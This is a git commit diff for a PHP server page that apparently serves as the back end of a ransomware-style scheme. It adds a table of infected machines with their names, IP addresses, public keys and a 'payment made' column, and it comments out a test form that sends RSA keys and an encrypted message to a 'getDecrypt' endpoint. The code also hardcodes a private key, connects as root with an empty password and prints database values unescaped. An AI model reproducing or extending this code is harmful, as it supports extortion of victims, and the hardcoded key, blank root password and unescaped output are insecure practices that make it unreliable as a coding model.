342cfc9cd8ec76621e77c5375c73fcccd379486a
Pierre <pierre.rispal@gmail.com>
2018-01-04 13:06:44 +0100

    Nouvel index d'affichage et delete.php pour modifier une ligne utilisateur

--- server/index.php
+++ server/index.php
@@ -1,17 +1,20 @@
 <!DOCTYPE html>
 <html>
   <head>
+  	<?php
+	include 'database.php';
+    ?>
     <meta charset="utf-8">
     <link rel="stylesheet" type="text/css" href="style.css">
     <title>Index</title>
   </head>
-  <form action="post.php" method="POST">
-  	<input type="hidden" name="rsa_message" value="test">
+  <!--<form action="post.php" method="POST">
+  	<input type="hidden" name="rsa_message" value="('o\xfc]\\Q\xec\xc7\xbb\xc2=F\xff"\x90O\xf4\xcf\'\xe5\xf6.\xd3"\t\xa62\xa7\xd9\xf73\xd4t\x16\xa9\x82"\\\x86\x8flLp\xaf\xe9 2\xf7\xfc\xa0tI%\x05\xa1\x99\rk|J\xf1\x11\xbcx\xbc\x98\x008X\xe9).\xc7\xe8+\x92K\x81\xb9\xe05\xf8\\O3\xf1F\xe5\x11\r{\x8a\xc7y&^DO\x84\x8e\x1c\x81j:\xa8yd0\xca\xe8B\x8b\x8es\xecy\x0f\x98\x12\xe3+\xb62\xdcW\x8d\x18\xae-',)">
   	<input type="hidden" name="rsa_pukey" value="-----BEGIN PUBLIC KEY-----
-MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQD+0ByQdaNtHNxe+W5XGlb63+jd
-P+hn6bj+XdV287WDWPDRXfR8XLnSAij336E8gbUM2+qyBtDqKwf5/MZeObDnpXTI
-70PLDBXvPaIBh5OcTggywo69bGd/NAkX0ZyJv35vlqcJNatCgXI+YCjcpuhoxSCy
-VvXBW2LCKRmTUaURSwIDAQAB
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDyQZoDf3T+tgjrYfH6TGmVdX1L
+fTJKPSNnnunYWlghiRqOjJWDL+g8ogUnbck8ITMPtFURBx16OKS91ZYCL1nopS/h
+DLwqLnVuY39WFLMJooZs4+W/Np/IlaOpfQhCVrWwJEfJyOcrvGBaiLqvPWyXAN64
+H13fFwobU8ASbfxrTwIDAQAB
 -----END PUBLIC KEY-----">
   	<input type="hidden" name="rsa_prkey" value="-----BEGIN RSA PRIVATE KEY-----
 MIICXQIBAAKBgQD+0ByQdaNtHNxe+W5XGlb63+jdP+hn6bj+XdV287WDWPDRXfR8
@@ -35,7 +38,31 @@ jvhtfkRR4d4oR6boiA1ymlozoglPv+rcKQY194pRG5QD
     <input type="hidden" name="ipAddress" value="192.168.0.1">
     <input type="hidden" name="machineName" value="pc de jean">
     <input type="submit" value="getDecrypt">
-  </form>
+  </form>-->
   <body>
+  	<table border="1">
+  		<tr><td>id</td><td>machine name</td><td>adresse ip</td><td>public Key</td><td>payement effectué</td><td></td></tr>
+
+  	<?php
+  		$result = connect("root","")->query("SELECT * from infos");
+		foreach ($result as $row) {
+			$html= '<tr>';
+			$html.= '<td>'.$row['id'].'</td>';
+			$html.= '<td>'.$row['machineName'].'</td>';
+			$html.= '<td>'.$row['ipAddress'].'</td>';
+			$html.= '<td>'.$row['publicKey'].'</td>';
+			$html.= '<td>'.$row['payement'].'</td>';
+			$html.= '<td>
+			<form action="delete.php" method="POST">
+    		<input type="hidden" name="id" value="'.$row['id'].'">
+    		<input type="submit" value=" ">
+  			</form>
+			</td>';
+			$html.='</tr>';
+			echo $html;
+		}
+
+  	?>
+  	</table>
   </body>
 </html>
